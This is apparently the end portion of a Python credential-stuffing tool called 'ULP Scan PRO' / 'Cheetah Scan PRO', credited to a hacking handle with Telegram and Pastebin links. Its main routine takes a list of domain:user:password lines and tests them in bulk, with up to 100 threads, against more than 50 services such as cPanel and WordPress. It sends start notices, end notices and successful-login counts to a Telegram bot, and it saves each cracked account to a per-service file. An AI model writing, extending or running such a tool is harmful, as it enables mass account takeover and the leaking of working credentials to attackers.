⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⠙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢸⡇⠘⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣴⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣷⣶⣬⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠈⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠋⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠛⠉⠀⠀⣀⣠⣴⣶⡶⠃⠐⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠟⠋⠉⣁⣠⣤⣶⣶⣿⣿⣿⣿⡟⢡⡆⢣⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⡸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⢿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠟⠛⠛⠉⠉⠀⠀⠀⠀⠛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣿⡇⠀⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⡆⠀⠀⠀⠀⠀⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢻⡿⠛⢉⠤⠂⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀
⣠⡆⠀⠗⠀⠀⠀⠀⢹⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⡠⢊⣡⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣶⣿⣿⣿
⣾⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣴⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿
⠋⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿
⠀⠀⠀⢺⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣠⡄⠀⢸⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⡇⠀⠀⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠢⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⢸⡇⠀⡆⢹⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⠀⠀⠀⠀⠀⠺⠃⠀⠀⠀⢀⡀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿

                                   -~~            ~~~~~~~~~   _ HACKFUT _  ~~-
"""
    info_text = [
        f"{THEME['BANNER_BORDER']}======================================================",
        f"{THEME['BANNER_TITLE']} ULP Scan PRO  {THEME['BANNER_VERSION']}(v4.1){Style.RESET_ALL}",
        f"{THEME['BANNER_EXTRA']} Format: Domain.com:UserName:Password",
        f"{THEME['BANNER_EXTRA']} 50+ Services: cPanel/WHM/WordPress/Joomla/Drupal/etc",
        f"{THEME['BANNER_EXTRA']} Telegram Auto-Report • Multi-Threading • Auto-Clean",
        f"{THEME['BANNER_EXTRA']} Fixed URL parsing for malformed formats",
        f"{THEME['BANNER_EXTRA']} Coded by @HackfutS3c",
        f"{THEME['BANNER_EXTRA']} Channel: https://t.me/+gsrpvshwGUc5MzI0",
        f"{THEME['BANNER_EXTRA']} PASTEBIN: https://pastebin.com/u/hackfut",
        f"{THEME['BANNER_EXTRA']} GITHUB: https://github.com/HackfutSec",
        f"{THEME['BANNER_BORDER']}======================================================"
    ]
    art_lines = seal_art.strip().split('\n')
    padding_top = (len(art_lines) - len(info_text)) // 2
    for i, art_line in enumerate(art_lines):
        text_line = ""
        text_index = i - padding_top
        if 0 <= text_index < len(info_text): text_line = info_text[text_index]
        print(f"{THEME['BANNER_ART']}{art_line:<65}   {text_line}{Style.RESET_ALL}")

def main():
    global invalid_lines_count, total_success_count
    display_main_banner()
    
    # Vérifier la configuration Telegram
    if TELEGRAM_BOT_TOKEN != "" and TELEGRAM_CHAT_ID != "":
        print(f"{THEME['SUCCESS']}[✓] Telegram bot configured - results will be sent automatically")
        # Envoyer un message de test
        send_telegram_message("🤖 <b>Cheetah Scan PRO</b> is now online and ready!")
    else:
        print(f"{THEME['ERROR']}[!] Telegram not configured - add your TOKEN and CHAT_ID in the code")
    
    file_name = input(f"\n{THEME['PROMPT']}Enter the name of your list file (e.g., list.txt): {Style.RESET_ALL}")
    
    try:
        with open(file_name, 'r', encoding='utf-8', errors='replace') as f:
            raw_lines = [line for line in f.read().splitlines() if line.strip()]
    except FileNotFoundError:
        print(f"{THEME['ERROR']}Error: File not found '{file_name}'"); return
    
    print(f"\n{THEME['INFO']}Loaded {len(raw_lines)} lines. Cleaning and testing simultaneously...")
    
    thread_count_str = input(f"\n{THEME['PROMPT']}Enter the number of threads (default: 100): {Style.RESET_ALL}")
    thread_count = int(thread_count_str) if thread_count_str.isdigit() and int(thread_count_str) > 0 else 100
    
    parser_info = f"Using '{PARSER}' parser."
    print(f"\n{THEME['INFO']}Starting check on {len(raw_lines)} entries with {thread_count} threads... ({parser_info})")
    print(f"{THEME['INFO']}Domains will be cleaned automatically during testing")
    print(f"{THEME['INFO']}All successes will be sent to Telegram automatically")
    
    os.makedirs(os.path.join(OUTPUT_FOLDER, CORRECT_FOLDER), exist_ok=True)
    
    start_msg = f"🚀 <b>Cheetah Scan PRO Started</b>\n📊 File: {file_name}\n🔢 Lines: {len(raw_lines)}\n⚡ Threads: {thread_count}\n🧹 Auto-cleaning enabled\n🎯 Services: 50+ CMS & Panels"
    send_telegram_message(start_msg)
    
    pool = ThreadPool(thread_count)
    pool.map(run_checker_instance, raw_lines)
    pool.close()
    pool.join()

    end_msg = f"✅ <b>Scan Completed!</b>\n📊 Total successes: {total_success_count}\n📁 Results saved in: {os.path.join(OUTPUT_FOLDER, CORRECT_FOLDER)}"
    send_telegram_message(end_msg)

    print(f"\n\n{THEME['STATS_HEADER']}" + "="*54)
    print(f"{THEME['STATS_HEADER']}{' '*22}COMPLETE{' '*23}")
    print(f"{THEME['STATS_HEADER']}" + "="*54)
    print(f"{THEME['STATS_HEADER']}Check finished! Success statistics:")
    total_found = 0
    correct_path = os.path.join(OUTPUT_FOLDER, CORRECT_FOLDER)
    for service in sorted(SERVICE_NAMES.values()):
        try:
            file_path = os.path.join(correct_path, f"{service}.txt")
            if os.path.exists(file_path):
                with open(file_path, 'r', encoding='utf-8') as f:
                    count = sum(1 for _ in f)
                    if count > 0:
                        print(f"  - {THEME['STATS_SERVICE']}{service:<20}:{Style.RESET_ALL} {count} hits")
                        total_found += count
        except Exception: pass
    
    print("------------------------------------------------------")
    print(f"  {THEME['STATS_TOTAL']}Total found: {total_found} successful accounts.{Style.RESET_ALL}")
    print(f"  {THEME['STATS_TOTAL']}Total successes sent to Telegram: {total_success_count}{Style.RESET_ALL}")
    print(f"  {THEME['STATS_TOTAL']}Invalid lines skipped: {invalid_lines_count}{Style.RESET_ALL}")
    print(f"  Results saved in directory: '{correct_path}'")
    print(f"  Global results file: '{GLOBAL_RESULTS_FILE}'")
    if invalid_lines_count > 0:
        print(f"  Invalid lines saved to: '{os.path.join(OUTPUT_FOLDER, 'invalid_lines.txt')}'")
    print(f"{THEME['STATS_HEADER']}" + "="*54)

if __name__ == '__main__':
    main()